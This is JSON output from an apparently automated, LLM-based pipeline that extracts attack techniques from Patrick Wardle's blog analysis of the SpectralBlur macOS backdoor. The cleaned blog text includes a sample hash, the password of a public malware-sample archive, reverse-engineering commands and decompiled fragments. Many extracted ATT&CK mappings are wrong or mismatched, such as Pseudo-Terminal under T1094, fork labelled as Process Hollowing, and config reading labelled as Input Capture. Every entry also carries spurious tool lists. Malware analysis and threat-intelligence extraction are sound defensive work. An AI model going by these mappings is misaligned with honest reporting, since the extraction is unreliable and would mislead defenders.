{
  "status": "success",
  "mode": "langchain",
  "extraction": {
    "status": "success",
    "extraction_summary": {
      "reports_processed": 1,
      "total_ttps_extracted": 27,
      "langchain_extractions": 2,
      "high_confidence_ttps": 0,
      "processing_time_ms": 3647.935
    },
    "extraction_results": [
      {
        "report_id": "pdf-430f731a4d4357c0b3050ca3b7d389f9",
        "extracted_ttps": [
          {
            "ttp_id": "63aeec7a-07f5-4db4-8640-d97b31bdcd6d",
            "report_id": "pdf-430f731a4d4357c0b3050ca3b7d389f9",
            "technique_name": "Pseudo-Terminal",
            "attack_id": "T1094",
            "tactic": "Defense Evasion",
            "description": "The malware sets up a pseudo-terminal via grantpt",
            "confidence_score": 0.704,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.184,
              "tool_mentions": 1.0,
              "context_richness": 0.86,
              "multiple_sources": 0.5
            },
            "indicators": [
              "grantpt",
              "posix_openpt"
            ],
            "tools": [
              "reg",
              "SpectralBlur",
              "at",
              "ping",
              "zip",
              "net",
              "sc"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "f3691030-fbc2-49c3-a980-41f9d6a9931a",
            "report_id": "pdf-430f731a4d4357c0b3050ca3b7d389f9",
            "technique_name": "Network Communication",
            "attack_id": "T1043",
            "tactic": "Command and Control",
            "description": "The malware communicates with its C2 server",
            "confidence_score": 0.685,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.161,
              "tool_mentions": 1.0,
              "context_richness": 0.76,
              "multiple_sources": 0.5
            },
            "indicators": [
              "socket_recv",
              "socket_send"
            ],
            "tools": [
              "reg",
              "SpectralBlur",
              "at",
              "ping",
              "zip",
              "net",
              "sc"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "3b817673-7fef-4c12-acff-1d30dcf8bca1",
            "report_id": "pdf-430f731a4d4357c0b3050ca3b7d389f9",
            "technique_name": "Command and Scripting Interpreter",
            "attack_id": "T1059",
            "tactic": "Execution",
            "description": "The malware uses a shell to execute commands",
            "confidence_score": 0.656,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.184,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "/bin/sh",
              "SpectralBlur/.macshare"
            ],
            "tools": [
              "reg",
              "SpectralBlur",
              "at",
              "ping",
              "zip",
              "net",
              "sc"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "3c065de9-819d-4ba5-8050-bccbe733abe7",
            "report_id": "pdf-430f731a4d4357c0b3050ca3b7d389f9",
            "technique_name": "File and Directory Permissions Modification",
            "attack_id": "T1222",
            "tactic": "Privilege Escalation",
            "description": "The malware modifies file permissions to hide itself",
            "confidence_score": 0.656,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.184,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "/Users/Shared/.macshare",
              "macshare.d"
            ],
            "tools": [
              "reg",
              "SpectralBlur",
              "at",
              "ping",
              "zip",
              "net",
              "sc"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "e2c9f12d-f4cc-4f1c-8ef6-1f3bc7a3e5dd",
            "report_id": "pdf-430f731a4d4357c0b3050ca3b7d389f9",
            "technique_name": "Data Encrypted",
            "attack_id": "T1027",
            "tactic": "Exfiltration",
            "description": "The malware encrypts its config and network traffic",
            "confidence_score": 0.656,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.184,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "xcrypt function",
              "custom stream cipher"
            ],
            "tools": [
              "reg",
              "SpectralBlur",
              "at",
              "ping",
              "zip",
              "net",
              "sc"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "f59baba6-d7b3-4ae8-8672-a3ea66ebde69",
            "report_id": "pdf-430f731a4d4357c0b3050ca3b7d389f9",
            "technique_name": "Process Hollowing",
            "attack_id": "T1093",
            "tactic": "Defense Evasion",
            "description": "The malware forks itself to complicate dynamic analysis",
            "confidence_score": 0.656,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.184,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "fork",
              "posix_openpt"
            ],
            "tools": [
              "reg",
              "SpectralBlur",
              "at",
              "ping",
              "zip",
              "net",
              "sc"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "64a811d6-4e42-4a2a-8acf-95143de42d4d",
            "report_id": "pdf-430f731a4d4357c0b3050ca3b7d389f9",
            "technique_name": "Create or Modify System Process",
            "attack_id": "T1543",
            "tactic": "Persistence",
            "description": "The malware creates or modifies system processes",
            "confidence_score": 0.652,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.199,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "proc_testconn function"
            ],
            "tools": [
              "reg",
              "SpectralBlur",
              "at",
              "ping",
              "zip",
              "net",
              "sc"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "df615a20-db0d-481e-9756-99a591decd52",
            "report_id": "pdf-430f731a4d4357c0b3050ca3b7d389f9",
            "technique_name": "Process Creation",
            "attack_id": "T1055",
            "tactic": "Execution",
            "description": "The malware creates new processes",
            "confidence_score": 0.651,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.152,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "execve",
              "fork"
            ],
            "tools": [
              "reg",
              "SpectralBlur",
              "at",
              "ping",
              "zip",
              "net",
              "sc"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "45ff3ea1-3a0f-4a43-b99d-8379e04c252b",
            "report_id": "pdf-430f731a4d4357c0b3050ca3b7d389f9",
            "technique_name": "Data Staging",
            "attack_id": "T1074",
            "tactic": "Exfiltration",
            "description": "The malware uploads and downloads files",
            "confidence_score": 0.649,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.138,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "proc_upload function",
              "proc_download function"
            ],
            "tools": [
              "reg",
              "SpectralBlur",
              "at",
              "ping",
              "zip",
              "net",
              "sc"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "e67ea8bf-2c1e-4bb1-bc42-6c3b83c489ec",
            "report_id": "pdf-430f731a4d4357c0b3050ca3b7d389f9",
            "technique_name": "Indicator Removal on Host",
            "attack_id": "T1070",
            "tactic": "Defense Evasion",
            "description": "The malware removes indicators from the host",
            "confidence_score": 0.646,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.161,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "proc_rmfile function"
            ],
            "tools": [
              "reg",
              "SpectralBlur",
              "at",
              "ping",
              "zip",
              "net",
              "sc"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "e7be2904-214d-4a46-ac75-6cf84dc771b8",
            "report_id": "pdf-430f731a4d4357c0b3050ca3b7d389f9",
            "technique_name": "File and Directory Discovery",
            "attack_id": "T1083",
            "tactic": "Discovery",
            "description": "The malware gathers file and directory information",
            "confidence_score": 0.646,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.161,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "proc_dir function"
            ],
            "tools": [
              "reg",
              "SpectralBlur",
              "at",
              "ping",
              "zip",
              "net",
              "sc"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "3ece81df-b7ab-4d0b-a588-d93f18c8c1ee",
            "report_id": "pdf-430f731a4d4357c0b3050ca3b7d389f9",
            "technique_name": "System Network Connections Discovery",
            "attack_id": "T1049",
            "tactic": "Discovery",
            "description": "The malware gathers system network connections information",
            "confidence_score": 0.646,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.161,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "socket_connect"
            ],
            "tools": [
              "reg",
              "SpectralBlur",
              "at",
              "ping",
              "zip",
              "net",
              "sc"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "db9937db-109f-47f0-bddb-4c1320459dc7",
            "report_id": "pdf-430f731a4d4357c0b3050ca3b7d389f9",
            "technique_name": "System Information Discovery",
            "attack_id": "T1082",
            "tactic": "Discovery",
            "description": "The malware gathers system information",
            "confidence_score": 0.645,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.115,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "gethostbyname",
              "getlogin"
            ],
            "tools": [
              "reg",
              "SpectralBlur",
              "at",
              "ping",
              "zip",
              "net",
              "sc"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "8d31961f-3ac7-4452-9580-21799ff0ecc6",
            "report_id": "pdf-430f731a4d4357c0b3050ca3b7d389f9",
            "technique_name": "System Network Configuration Discovery",
            "attack_id": "T1016",
            "tactic": "Discovery",
            "description": "The malware gathers network configuration information",
            "confidence_score": 0.643,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.138,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "getsockopt"
            ],
            "tools": [
              "reg",
              "SpectralBlur",
              "at",
              "ping",
              "zip",
              "net",
              "sc"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "745eede0-841a-4b3e-9efb-60d8d11176ca",
            "report_id": "pdf-430f731a4d4357c0b3050ca3b7d389f9",
            "technique_name": "System Owner/User Discovery",
            "attack_id": "T1033",
            "tactic": "Discovery",
            "description": "The malware gathers system owner/user information",
            "confidence_score": 0.643,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.138,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "getpwuid"
            ],
            "tools": [
              "reg",
              "SpectralBlur",
              "at",
              "ping",
              "zip",
              "net",
              "sc"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "371f6daa-dbfa-4517-b092-9a76ecbd25ce",
            "report_id": "pdf-430f731a4d4357c0b3050ca3b7d389f9",
            "technique_name": "Application Window Discovery",
            "attack_id": "T1010",
            "tactic": "Discovery",
            "description": "The malware gathers application window information",
            "confidence_score": 0.643,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.138,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "proc_none function"
            ],
            "tools": [
              "reg",
              "SpectralBlur",
              "at",
              "ping",
              "zip",
              "net",
              "sc"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "6726c6a3-826f-4de3-a34a-15de553041de",
            "report_id": "pdf-430f731a4d4357c0b3050ca3b7d389f9",
            "technique_name": "System Time Discovery",
            "attack_id": "T1124",
            "tactic": "Discovery",
            "description": "The malware gathers system time information",
            "confidence_score": 0.643,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.138,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "time"
            ],
            "tools": [
              "reg",
              "SpectralBlur",
              "at",
              "ping",
              "zip",
              "net",
              "sc"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "9b22caa7-f7ca-4fc2-8338-793018aba7c8",
            "report_id": "pdf-430f731a4d4357c0b3050ca3b7d389f9",
            "technique_name": "File Deletion",
            "attack_id": "T1107",
            "tactic": "Defense Evasion",
            "description": "The malware deletes files",
            "confidence_score": 0.642,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.092,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "unlink API",
              "proc_rmfile function"
            ],
            "tools": [
              "reg",
              "SpectralBlur",
              "at",
              "ping",
              "zip",
              "net",
              "sc"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "7e324859-8d69-42d2-9516-95e1b10d3c1f",
            "report_id": "pdf-430f731a4d4357c0b3050ca3b7d389f9",
            "technique_name": "Input Capture",
            "attack_id": "T1056",
            "tactic": "Collection",
            "description": "The malware captures input",
            "confidence_score": 0.636,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.092,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "proc_getcfg function"
            ],
            "tools": [
              "reg",
              "SpectralBlur",
              "at",
              "ping",
              "zip",
              "net",
              "sc"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "a5815efa-7ada-45d0-a5b4-70aacab09398",
            "report_id": "pdf-430f731a4d4357c0b3050ca3b7d389f9",
            "technique_name": "Application Layer Protocol",
            "attack_id": "T1071",
            "tactic": "Command And Control",
            "description": "Detected Application Layer Protocol activity via NLP pattern matching",
            "confidence_score": 0.633,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.199,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "reg",
              "at",
              "ping",
              "zip",
              "net",
              "sc"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "ee677673-a2ef-4779-873e-82aedd2258c1",
            "report_id": "pdf-430f731a4d4357c0b3050ca3b7d389f9",
            "technique_name": "Process Injection",
            "attack_id": "T1055.002",
            "tactic": "Defense Evasion",
            "description": "The malware injects processes",
            "confidence_score": 0.632,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.9,
              "ioc_evidence": 0.54,
              "description_detail": 0.13,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "_pthread_create"
            ],
            "tools": [
              "reg",
              "SpectralBlur",
              "at",
              "ping",
              "zip",
              "net",
              "sc"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "a2215e1c-1c16-4f0a-8abb-ec607816ce57",
            "report_id": "pdf-430f731a4d4357c0b3050ca3b7d389f9",
            "technique_name": "Obfuscated Files or Information",
            "attack_id": "T1027",
            "tactic": "Defense Evasion",
            "description": "Detected Obfuscated Files or Information activity via NLP pattern matching",
            "confidence_score": 0.631,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.185,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "reg",
              "at",
              "ping",
              "zip",
              "net",
              "sc"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "b608f4ed-b47d-4955-b429-2044f8318a38",
            "report_id": "pdf-430f731a4d4357c0b3050ca3b7d389f9",
            "technique_name": "Exfiltration Over C2 Channel",
            "attack_id": "T1041",
            "tactic": "Exfiltration",
            "description": "Detected Exfiltration Over C2 Channel activity via NLP pattern matching",
            "confidence_score": 0.631,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.185,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "reg",
              "at",
              "ping",
              "zip",
              "net",
              "sc"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "6c97146f-9d3e-43d7-beee-9e18c201d569",
            "report_id": "pdf-430f731a4d4357c0b3050ca3b7d389f9",
            "technique_name": "Obfuscated Files or Information",
            "attack_id": "T1027.003",
            "tactic": "Exfiltration",
            "description": "The malware uses obfuscated strings",
            "confidence_score": 0.629,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.9,
              "ioc_evidence": 0.54,
              "description_detail": 0.115,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "obfuscated strings"
            ],
            "tools": [
              "reg",
              "SpectralBlur",
              "at",
              "ping",
              "zip",
              "net",
              "sc"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "cd275b9a-4e48-4554-9e6d-dd698629e02e",
            "report_id": "pdf-430f731a4d4357c0b3050ca3b7d389f9",
            "technique_name": "Exploit Public-Facing Application",
            "attack_id": "T1190",
            "tactic": "Initial Access",
            "description": "Detected Exploit Public-Facing Application activity via NLP pattern matching",
            "confidence_score": 0.628,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.162,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "reg",
              "at",
              "ping",
              "zip",
              "net",
              "sc"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "c76a062a-b765-41fd-81b9-2e8771a1f001",
            "report_id": "pdf-430f731a4d4357c0b3050ca3b7d389f9",
            "technique_name": "Archive Collected Data",
            "attack_id": "T1560",
            "tactic": "Collection",
            "description": "Detected Archive Collected Data activity via NLP pattern matching",
            "confidence_score": 0.628,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.162,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "reg",
              "at",
              "ping",
              "zip",
              "net",
              "sc"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "fb4ee95b-12fa-4a4e-a999-ae29f9ad9e7d",
            "report_id": "pdf-430f731a4d4357c0b3050ca3b7d389f9",
            "technique_name": "Screen Capture",
            "attack_id": "T1113",
            "tactic": "Collection",
            "description": "Detected Screen Capture activity via NLP pattern matching",
            "confidence_score": 0.624,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.139,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "reg",
              "at",
              "ping",
              "zip",
              "net",
              "sc"
            ],
            "extraction_method": "nlp_indicator"
          }
        ],
        "nlp_analysis": {
          "processed_text": {
            "cleaned_text": "Objective-See s Blog objective-see.org/blog/blog_0x78.html Analyzing DPRK s SpectralBlur The first malware of 2024 is (already) here  by: Patrick Wardle / January 4  2024     Want to play along  As  Sharing is Caring  I ve uploaded a sample of the malware SpectralBlur.zip to our public macOS malware collection. The password is: infect3d ...please though  don t infect yourself    Background Not three days into 2024 Greg Lesnewich tweeted the following:  100DaysofYARA day 03 - talking SpectralBlur  a MacOS (and other OS   ) backdoor linked to TA444/Bluenoroff  that I suspect is a cousin of the KandyKorn family our pals at Elastic found  https://t.co/P2TGw98UR6 pic.twitter.com/Y8U3hsjNiF   Greg Lesnewich (@greglesnewich) January 3  2024 In both his twitter (err  X) thread and in a subsequent posting he provided a comprehensive background and triage of the malware dubbed SpectralBlur. In terms of its capabilities he noted: SpectralBlur is a moderately capable backdoor  that can upload/download files  run a shell  update its configuration  delete files  hibernate or sleep  based on commands issued from the C2. -Greg He also pointed out similarities to/overlaps with the DPRK malware known as KandyKorn (that we covered in our  Mac Malware of 2024  report)  while also pointing out there was differences  leading him to conclude: We can see some similarities ... to the KandyKorn. But these feel like families developed by different folks with the same sort of requirements. -Greg 6/26/24  9:33 AM Objective-See s Blog https://objective-see.org/blog/blog_0x78.html 1/11 Greg s writeup  though focusing more on the discovery and triage of the SpectralBlur  is excellent a read  and provides essential background and context for our more indepth analysis. Have a read: 100DaysofYARA - SpectralBlur Greg ended his write up  nothing that he hadn t had time yet to fully analyze the sample  but  if anyone in the community is keen on it  go for it   . As I m rather obsessed with (new) Mac malware I decided to dig in more. Triage The sample of SpectralBlur mentioned in his tweets and triage has a SHA-1 hash of 06c8c84fb0a85bdf3520608b0a5c910b77e3b8c1. Popping over to VirusTotal to grab the sample  we can see that currently it is not flagged as malicious by any of the AV engines: SpectralBlur on VirusTotal (Scan Date: Aug. 2023) Triggering a rescan of the malware on VirusTotal shows it is (now) detected by at least one AV engine (ESET). Moreover its worth noting that the previous scan of the malware (refereneced in the screenshot above) was performed in August 2023. Thus  though at that time no AV engine flagged the item as malicous  between now and then  detections could have been added. Looking at telemetric data we can see its name is either .macshare or mac.jpg  and at least on one macOS system it was found in /Users/Shared/.macshare. Prefixing the name with a  .  will hide the file from Finder (unless the viewing of hidden files has been enabled). This SpectralBlur sample was initially submitted to VirusTotal on 2023-08-16 from Colombia (CO). Interestingly in VirusTotal s telemetric data  we can also see that at least one of Objective-See s tools (which  integrate with VirusTotal  for example to allow users to submit unrecognized files) encountered the malware in the wild too  how cool  Using WhatsYourSign we can see the binary is not signed: WhatsYourSign shows the malware is not signed You can also extract codesigning information (or lack thereof) from the terminal via macOS s codesign utility: 6/26/24  9:33 AM Objective-See s Blog https://objective-see.org/blog/blog_0x78.html 2/11   codesign -dvv SpectralBlur/.macshare SpectralBlur/.macshare: code object is not signed at all Via the terminal we can also see its a 64bit Intel (x86_64) binary:   file SpectralBlur/.macshare SpectralBlur/.macshare: Mach-O 64-bit executable x86_64 Next let s pull out any embedded strings  as this can give a good idea of the malware s capabilities and also guide continued analysis:   strings SpectralBlur/.macshare There is NO WARRANTY  to the extent permitted by law.  s.d /dev/null SHELL /bin/sh ... Other than some strings related to the shell  not a lot  Maybe others are obfuscated  (We also didn t show function names or API imports in the strings output  as these show up better via nm). Using nm we can extract symbols which will include the Malware s function names  as well as APIs that the malware calls into ( imports ). Let s start with just function names  which will be found the __TEXT segment/section: __text. We can use nm s -s to limit its output to just a specified segment/section: 6/26/24  9:33 AM Objective-See s Blog https://objective-see.org/blog/blog_0x78.html 3/11   nm -s __TEXT __text SpectralBlur/.macshare 0000000100001540 T _hangout 00000001000034f0 T _init 0000000100001570 T _init_fcontext 0000000100001870 T _load_config 0000000100003650 T _main 0000000100002a10 T _mainprocess 0000000100003370 T _mainthread 00000001000031c0 T _openchannel 00000001000029a0 T _proc_die 0000000100001b10 T _proc_dir 0000000100002420 T _proc_download 0000000100002290 T _proc_download_content 00000001000027e0 T _proc_getcfg 00000001000028c0 T _proc_hibernate 00000001000019f0 T _proc_none 00000001000029d0 T _proc_restart 00000001000025a0 T _proc_rmfile 0000000100002860 T _proc_setcfg 0000000100001a90 T _proc_shell 0000000100002930 T _proc_sleep 0000000100001a20 T _proc_stop 00000001000026b0 T _proc_testconn 0000000100002160 T _proc_upload 0000000100002040 T _proc_upload_content 00000001000015f0 T _read_packet 0000000100001930 T _save_config 0000000100001500 T _sigchild 00000001000011f0 T _socket_close 0000000100000d10 T _socket_connect 0000000100001140 T _socket_recv 00000001000010c0 T _socket_send 0000000100000be0 T _wait_read 0000000100001730 T _write_packet 00000001000017e0 T _write_packet_value 0000000100001270 T _xcrypt Looks like functions dealing with a config (e.g.  load_config)  network communications (e.g.  socket_recv  socket_send)  and encryption (xcrypt). But also then  standard backdoor capabilities implemented (as noted by Greg)  in function prefixed with proc. And what about the APIs the malware imports to call into  Again we can use nm  this time the -u flag: 6/26/24  9:33 AM Objective-See s Blog https://objective-see.org/blog/blog_0x78.html 4/11   nm -m SpectralBlur/.macshare _connect _dup2 _execve ... _fork _fread _fwrite ... _gethostbyname _getlogin _getpwuid _getsockopt _grantpt ... _ioctl _kill ... _pthread_create _rand _recv _send _socket _unlink _waitpid _write ... From these imports we can surmise that the malware performs file I/O (fread  fwrite  unlink)  network I/O (socket  recv  send)  and spawning/managing processes (execve  fork  kill). We ll see these APIs are invoked by the malware often in response to commands. For example  the malware s proc_rmfile function invokes the unlink API to remove a file: 1int proc_rmfile(int arg0  int arg1) { 2 var_10   arg1  3 var_18   var_10   0x10  4 ... 5 unlink(var_18)  6 ... Based on this triage (and Greg s report)  we ve developed what is likely a reasonable understanding of the malware. Still  its always good to validate triages with continued static  but also dynamical analysis. So  onward  Analysis At the start of the malware disassembly it calls into a function named init. Here  it builds a path to its config  and then opens it. The path is built by appending .d to the malware s binary full path: 6/26/24  9:33 AM Objective-See s Blog https://objective-see.org/blog/blog_0x78.html 5/11 init(...){ _sprintf_chk(config  0x0  0x41a    s.d   malwaresPath)  ... loadConfig(...) } We can confirm this in a debugger  where at a call to fopen (in the load_config function) the malware will attempt to open the file macshare.d  in the directory where the malware is currently running (e.g. /Users/user/Downloads/).   lldb /Users/user/Downloads/macshare (lldb)   thread  1  queue    com.apple.main-thread  macshare load_config: -  0x100001890   32 : callq 0x100003d8c   symbol stub for: fopen Target 0: (macshare) stopped. (lldb) x/s $rdi 0x100008820:  /Users/user/Downloads/macshare.d  We can also see this in a File Monitor:   ./FileMonitor.app/Contents/MacOS/FileMonitor -pretty -filter macshare {  event  :  ES_EVENT_TYPE_NOTIFY_OPEN    file  : {  destination  :  /Users/user/Downloads/macshare.d    process  : {  pid  : 6818   name  :  macshare    path  :  /Users/user/Downloads/macshare  } } } By looking at its cross-references (xrefs)  we can see the xcrypt function is invoked to encrypt/decrypt the malware s config and network traffic: 6/26/24  9:33 AM Objective-See s Blog https://objective-see.org/blog/blog_0x78.html 6/11 XRefs to the xcrypt function  the xcrypt function according to ChatGPT appears to be a custom stream cipher. While static analysis shows that the key may be stored at the start of this config (address 0x100008c3a)  and set to random 64bit value:  qword_100008c3a   sign_extend_64(rand())   time(0x0)   sign_extend_64(rand()   rand())  Back to the config file  unfortunately  I (currently) don t have access an example config. Thus some of our continued analysis is based solely on static analysis. Once the init function returns (which loaded the config)  that malware performs a myriad of actions that appear to complicate dynamic analysis and perhaps detection. This including forking itself  but also setting up a pseduo-terminal via posix_openpt (as noted by Phil Stokes): Uses grantpt to set up a pseudo-terminal. Not seen that before. Interesting    Phil Stokes       (@philofishal) January 4  2024  this is followed by more forks  execs  and more. Again  if I had to guess  this simply to complicate analysis (and/or perhaps  making it a detached/ isolated  process complicated detections)  We ll also see that the psuedo-terminal is used to execute shell commands from the attacker s remote C C server. Regardless we can skip over this all  and simply continue execution (or static analysis) where a new thread (named _mainthread) is spawned. After invoking functions such as openchannel and socket_connect to likely connect to its C C server (whose address likely would be found in the malware s config: macshare.d)  it invokes a function named mainprocess. The mainprocess function (eventually) invokes the read_packet function which appears to return the index of a command. The code in mainprocess function then iterates over an array named _procs in order to find the handler for the specified command (that I ve 6/26/24  9:33 AM Objective-See s Blog https://objective-see.org/blog/blog_0x78.html 7/11 named commandHandler in the below disassembly). The command handler is then directly invoked: 1int mainprocess(int arg0  int arg1) { 2 3 var_558   read_packet(...)  4 if (var_558    0x0) goto loc_100002dfc  5 6loc_100002dfc: 7 var_560    (var_558   0x8)  8 commandHandler   0x0  9 addrOfProcs   _procs  10 do { 11 var_5C1   0x0  12 if ( addrOfProcs    0x0) { 13 var_5C1   (var_568    0x0   0x1 : 0x0)   0xff  14 } 15 if ((var_5C1   0x1)    0x0) { 16 break  17 } 18 if ( addrOfProcs    var_560) { 19 commandHandler    (addrOfProcs   0x4)  20 } 21 addrOfProcs   addrOfProcs   0xc  22 } while (true)  23 24 25 var_538   (commandHandler)(var_530  var_558)  26 27} After creating a custom structure 